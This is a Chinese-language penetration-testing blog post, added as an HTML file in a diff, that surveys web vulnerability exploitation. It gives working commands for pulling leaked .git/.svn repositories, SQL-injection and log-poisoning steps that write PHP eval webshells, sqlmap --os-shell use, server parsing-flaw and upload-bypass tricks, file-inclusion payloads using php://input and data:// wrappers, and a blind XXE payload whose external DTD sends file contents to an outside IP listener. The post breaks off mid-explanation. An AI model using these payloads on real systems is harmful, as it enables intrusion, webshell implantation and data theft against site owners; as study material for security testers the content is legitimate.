@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    渗透测试之漏洞挖掘 |
+    
+    Melon</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-渗透测试之漏洞挖掘" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      渗透测试之漏洞挖掘
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
+  <time datetime="2019-12-13T05:23:58.000Z" itemprop="datePublished">2019-12-13</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发严重的后果。最常见的漏洞有缓冲区溢出漏洞、整数溢出漏洞、指针覆盖漏洞等。</p>
+<a id="more"></a>
+
+<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><h3 id="1-敏感目录文件扫描"><a href="#1-敏感目录文件扫描" class="headerlink" title="1.敏感目录文件扫描"></a>1.敏感目录文件扫描</h3><h4 id="1-查找目标各类web入口"><a href="#1-查找目标各类web入口" class="headerlink" title="1.查找目标各类web入口"></a>1.查找目标各类web入口</h4><p>普通网站后台，其他web控制台，碰到任何入口的第一反应就是顺手测试弱口令如果没有结果记录下来可以进行爆破，没有验证码的可以尝试爆破。限制登陆次数尝试伪造IP绕过。</p>
+<h4 id="2-各类敏感文件泄露"><a href="#2-各类敏感文件泄露" class="headerlink" title="2.各类敏感文件泄露"></a>2.各类敏感文件泄露</h4><h5 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h5><p><strong>.git/git</strong> 利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> 手动利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure>
+
+<p><strong>.hg/Mercurial</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure>
+
+<p><strong>.svn/Subversion</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">cd www.example.com &amp;&amp; svn revert --recursive .</span><br></pre></td></tr></table></figure>
+
+<p><strong>.bzr/Bazaar</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure>
+
+<p>CVS 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">cd www.example.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h5><p><strong>.DS_Store文件泄露 (Desktop Services Store)</strong></p>
+<p>是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息,如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. </p>
+<p>利用工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p>
+<p><strong>WEB-INF泄露</strong></p>
+<p>在Java的<a href="http://download.oracle.com/otn-pub/jcp/servlet-2.4-fr-spec-oth-JSpec/servlet-2_4-fr-spec.pdf" target="_blank" rel="noopener">Servlet 文档</a>中,说到<code>WEB-INF</code>目录”包含了所有web应用会用到但是不处于web路径中的资源”, 也就是说, WEB-INF目录下的内容是不属于公开页面的.<br>web应用可以通过<code>getResource</code>等API在servlet的上下文中访问到这些资源.<br>通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>
+
+<p>利用方式：通过web.xml文件推测应用组件相关类的名字, 然后在src目录下查找代码, 如果没有源代码可以直接下载class文件反编译即可.</p>
+<p><strong>备份文件泄露</strong></p>
+<p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf bakup.tgz</code>的命令将网站进行备份,这样整站的源代码都能直接被用户打包下载了；<br>另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br>如vim的<code>.swp</code>, 从而泄露了该网页的源代码.</p>
+<p>利用方法：对于打包文件而言, 渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站, 说不定会有意外惊喜.<br>对于网页的临时备份文件, 可以扫描对应页面的.swp或者.bak等后缀, 说不定也能找到有用的信息.</p>
+<p><strong>配置文件泄露</strong><br>现代WEB开发往往不会重新造轮子, 而是基于成熟的框架进行配置, 如果渗透测试人员知道该网站是基于什么类型的框架,<br>就可能通过该框架的文档获得重要配置文件的路径, 如果是开源框架, 同时也能获得源代码, 因此配置文件泄露的严重性也是不言而喻的.</p>
+<p>利用方法：通过识别网站指纹得知其框架类型, 然后手工测试重要的配置文件是否可以获取. 如果是批量测试, 则可以事先准备好常见的配置文件路径, 如wordpress的/wp-config.php等, 组织成字典然后用脚本进行批量测试. 可以参考<a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="noopener">猪猪侠的字典</a>.</p>
+<p><strong>配置错误导致的泄露</strong></p>
+<p>Windows IIS / Apache 目录穿越</p>
+<p>目录穿越漏洞原理比较简单, 程序在实现上没有充分过滤用户输入的../之类的目录跳转符, 导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件.</p>
+<p><strong>Nginx配置安全</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">    alias /home;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>例如这样配置 访问 url/file 会正常显示服务器上/home的文件，但是访问url/file../ 就会出现 /home/../访问到服务器的根目录造成目录穿越</p>
+<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>首先确认数据库的用户权限</p>
+<h4 id="1-可以注入的一些部分"><a href="#1-可以注入的一些部分" class="headerlink" title="1.可以注入的一些部分"></a>1.可以注入的一些部分</h4><p>GET注入在url中</p>
+<p>在POST注入</p>
+<p>在HTTP头部注入 例如：cookie Referer user-agent X-Forwarded-For 等等</p>
+<p>二次注入，宽字节注入，ajax/json注入，nosql注入，用来对付为静态的中转注入 等等</p>
+<h4 id="2-管理员权限"><a href="#2-管理员权限" class="headerlink" title="2.管理员权限"></a>2.管理员权限</h4><p><strong>尝试直接写webshell</strong>：</p>
+<p><strong>日志写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.show variables like ‘%general%&apos;; #查看配置</span><br><span class="line">2.set global general_log = on; #开启general log模式</span><br><span class="line">3.set global general_log_file = ‘/var/www/html/melon.php&apos;; #设置日志目录为shell地址</span><br><span class="line">4.select ‘&lt;?php eval($_POST[melon]);?&gt;’ #写入shell</span><br><span class="line">不成功的案例，如果mysql 被降权，是无法写入到其他的站点目录的，除非你的目标目录是可以写入的。</span><br></pre></td></tr></table></figure>
+
+<p><strong>正常sql写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过SQL注入select into outfile实现，如：</span><br><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[melon]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br><span class="line">2.如果过过滤了union select可以使用：</span><br><span class="line">LIMIT 0,1 INTO OUTFILE &apos;这里是路径&apos; LINES TERMINATED BY &apos;这里是你想写的内容&apos;--</span><br></pre></td></tr></table></figure>
+
+<p><strong>sqlmap写shell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br><span class="line">交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。</span><br><span class="line"></span><br><span class="line">--os-shell</span><br><span class="line">写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。</span><br><span class="line">注意:关闭sqlmap文件就会被删除。</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地写入webshell</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，--file-write &quot;./mst/mst.txt&quot; --file-dest &quot;网站的绝对路径/melon.php&quot;。</span><br><span class="line">注意需要最高权限。</span><br></pre></td></tr></table></figure>
+
+<p><strong>尝试执行系统命令</strong></p>
+<p>反弹shell，cmd</p>
+<p><strong>尝试读取数据库配置文件中的账号密码</strong></p>
+<h4 id="3-普通数据库权限"><a href="#3-普通数据库权限" class="headerlink" title="3.普通数据库权限"></a>3.普通数据库权限</h4><p>查询网站管理账号密码，搜集会员账号密码数据，尝试万能密码bypass登陆 等等</p>
+<h3 id="3-上传"><a href="#3-上传" class="headerlink" title="3.上传"></a>3.上传</h3><h4 id="1-各个web中间件解析漏洞"><a href="#1-各个web中间件解析漏洞" class="headerlink" title="1.各个web中间件解析漏洞"></a>1.各个web中间件解析漏洞</h4><h5 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
+<p><strong>目录解析(6.0)</strong></p>
+<p>案例：<code>www.xxx.com/xx.asp/xx.jpg</code></p>
+<p>原理：服务器默认会把.asp，.asa目录下的文件全部解析乘asp文件</p>
+<p><strong>文件解析</strong></p>
+<p>案例：<code>www.xxx.com/xx.asp;,jpg</code></p>
+<p>原理：服务默认不解析分号之后的内容，因此<code>xx.asp;,jpg</code>便被解析成了asp文件</p>
+<p><strong>解析文件类型</strong></p>
+<p>IIS6.0默认的可执行文件除了asp还包含这三种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa /xxx.cer /xxx.cdx</span><br></pre></td></tr></table></figure>
+
+<h5 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h5><p>案例：<code>www.xxx.com/xxx.php.aaa.rar</code></p>
+<p>原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 xxx.php.aaa.rar “.aaa”和”.rar” 这两种后缀是Apache不可识别解析,Apache就会把xxx.php.aaa.rar解析成php。</p>
+<p><strong>CVE-2017-15715</strong></p>
+<p><strong>罕见后缀</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xxx:~$ cat /etc/mime.types | grep php</span><br><span class="line">  #application/x-httpd-php          	phtml pht php</span><br><span class="line">  #application/x-httpd-php-source           	phps</span><br><span class="line">  #application/x-httpd-php3         			php3</span><br><span class="line">  #application/x-httpd-php3-preprocessed	 	php3p</span><br><span class="line">  #application/x-httpd-php4         			php4</span><br><span class="line">  #application/x-httpd-php5         			php5</span><br></pre></td></tr></table></figure>
+
+<h5 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h5><p>原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而test.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
+<p>案例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/melon.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg%00.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/%20\melon.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-bypass-上传检测"><a href="#2-bypass-上传检测" class="headerlink" title="2.bypass 上传检测"></a>2.bypass 上传检测</h4><p>黑名单，白名单可配合解析漏洞，截断，.htaccess，配合本地包含一起利用。</p>
+<p>补：截断：%00</p>
+<h4 id="3-各类编辑器利用"><a href="#3-各类编辑器利用" class="headerlink" title="3.各类编辑器利用"></a>3.各类编辑器利用</h4><p>FCKeditor编辑器，EWEbeditor，CKFinder，南方数据编辑器southidceditor，UEDITOE，DotNetTextBox，PHPWEB网站管理系统后台Kedit编辑器，Cute Editor 在线编辑器本地包含漏洞 等等</p>
+<h3 id="4-未授权访问"><a href="#4-未授权访问" class="headerlink" title="4.未授权访问"></a>4.未授权访问</h3><p>前端验证绕过，直接访问[ajax]，验证有死角没有验证全部页面 等等</p>
+<h3 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h3><p><em>本地包含（LFI），远程包含（RFI），远程文件包含需要在php.ini中开启 allow_url_fopen=on、allow_url_include=on(默认是关闭的 )。</em></p>
+<p>文件包含的本质其实和C语言中预处理指令一样。那么这句话等价替换就是 <code>&lt;?php &lt;?php phpinfo()?&gt; ?&gt;</code>其实不然，如果替换成这样，后面的?&gt;会被页面打印出来,正确的是它是将文件中<code>&lt;?php ?&gt;</code> 去除，将剩余的内容进行替换,那这样的话再利用的时候不用考虑文件包含的文件类型是什么，只需要考虑文件之中是否有我们所需要的一句话木马就可以了。</p>
+<p><strong>涉及的函数</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试</strong>：</p>
+<p>melon.txt代码为  <code>&lt;?php eval($_REQUEST[&#39;melon&#39;]);?&gt;</code></p>
+<p>melon.php代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
+<p>利用：<code>www.xxx.com/melon.php?file=melon.txt&amp;melon=system(&#39;ls&#39;);</code></p>
+<p>防止混淆：目录遍历：如果没有文件包含漏洞，仅仅通过在url栏中操作，不论你如何../../../回退，都无法跳出服务器的公开目录，也是就说，你只能请求公开目录中的文件。但是如果有文件包含漏洞，那么我们可以通过传参，../../../../../一直退到服务器的根目录，从而能够目录遍历，即访问服务器上任何一个文件夹中的任何一个文件，不论这个目录是公开目录还是非公开目录。</p>
+<p><strong>利用本地包含配合数据库获取shell的一种思路</strong>：</p>
+<p>数据库储存表会将表存在相应的文件中。也就说假如我们将某个表的某个字段名，命名为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code>,那么这句话就会被写入到对应的.frm文件中去。</p>
+<p>在本地创建melon.php文件代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
+<p>创建数据库-&gt;创建表-&gt;创建字段为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8.png" alt="html">    </p>
+<p>图中可以明确的看出一句话已经写进了文件了这时候只需要利用即可</p>
+<p> <code>http://www.xxx.com/melon.php?file=../../../../../../../phpStudy/PHPTutorial/MySQL/data/melon/test.frm&amp;melon=phpinfo();</code></p>
+<p>还有一个问题就是获取数据库的路径如果没有这一点我们是无法知道frm的位置的，如果有sql注入我们可以通过<code>SELECT @@datadir</code>来获取data文件夹绝对路径然后拼接上我们的 数据库名/表名.frm 就可以了。</p>
+<p><strong>利用本地包含配合Apache获取shell的一种思路</strong>：</p>
+<p>使用burp对目标站抓包 修改User-Agent: <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
+<p>此时查看Apache日志：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/apachelog.png" alt="html">    </p>
+<p>利用：<code>http://url/file.php?file=/var/log/apache2/access.log?melon=phpinfo();</code></p>
+<p><strong>php伪协议</strong></p>
+<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>
+
+<p><code>http://url/file.php?file=php://filter/read=convert.base64-encode/resource=./file.php</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filebase64.png" alt="html">    </p>
+<p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>
+
+<p><code>http://localhost:8888/file.php?file=php://input</code> 同时POST <code>&lt;?php phpinfo();?&gt;</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filephpinput.png" alt="html">    </p>
+<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>
+
+<p>zip:// 协议</p>
+<p>使用方法：zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
+<p>在get请求中#会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
+<p><code>http://127.0.0.1:8888/file.php?file=zip://D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.zip%23file.txt</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpzip.png" alt="html">    </p>
+<p>bzip2:// 协议</p>
+<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.bzip2://./melon.bz2</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpbz2.png" alt="html">    </p>
+<p>zlib:// 协议</p>
+<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.zlib://./melon.gz</code></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpgz.png" alt="html">    </p>
+<p>data://协议</p>
+<p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://协议必须双在on才能正常使用；</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpdata.png" alt="html">    </p>
+<p>###6.任意文件读取</p>
+<p><strong>XXE（有回显）</strong></p>
+<p>PHP代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xxe.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对xxe.php发起请求 POST中发送xml数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY melon SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;melon;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxe.png" alt="html">    </p>
+<p>可以看到响应头获取到了文件的数据</p>
+<p><strong>XXE（无回显）</strong></p>
+<p>PHP代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xxes.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对xxe.php发起请求 POST中发送xml数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//因为本地测试用的是windows 所以就读取system.ini为例</span><br><span class="line">&lt;!DOCTYPE roottag [ </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.txt&quot;&gt; </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://47.9x.xx.xx/xxe.dtd&quot;&gt; </span><br><span class="line">%dtd;]&gt; </span><br><span class="line">&lt;name&gt;&amp;send;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>远端服务器存放的dtd代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://47.93.12.104:7777/?%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes1.png" alt="html">    </p>
+<p>此时xml是执行的但是没有回显出来，我们看一下服务器端。</p>
+<p>服务器端采用的nc监听端口</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes2.png" alt="html">    </p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/xxes3.png" alt="html">    </p>
+<p>我们来说一下外部调用实体化的流程：</p>
